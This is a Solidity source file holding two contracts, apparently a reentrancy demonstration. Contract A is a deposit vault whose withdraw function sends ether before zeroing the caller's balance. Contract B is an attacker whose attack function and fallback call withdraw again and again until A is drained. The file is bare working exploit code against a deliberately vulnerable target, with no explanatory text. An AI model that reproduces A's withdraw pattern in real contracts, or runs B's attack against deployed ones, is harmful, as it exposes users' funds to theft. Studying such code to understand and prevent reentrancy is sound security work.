// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract A {
    mapping(address =>uint) public balances;

    event Sent(address, address, uint);
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }


    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0,"You don't have enough funds. Aborting!");
        
        emit Sent(address(this),msg.sender,bal);
        
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to transfer the funds, aborting");
        
        balances[msg.sender] = 0;

    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract B {
    A public contractA;

    //event Received(address, uint);
    event Received(address, uint, string);

    constructor(address payable _contractA) {
        contractA = A(_contractA);
    }


    fallback() external payable {
        emit Received(msg.sender, msg.value, "Fallback was called");
        if (address(contractA).balance >= 1 ether) {
            contractA.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Error value!");
        contractA.deposit{value: 1 ether}();
        contractA.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

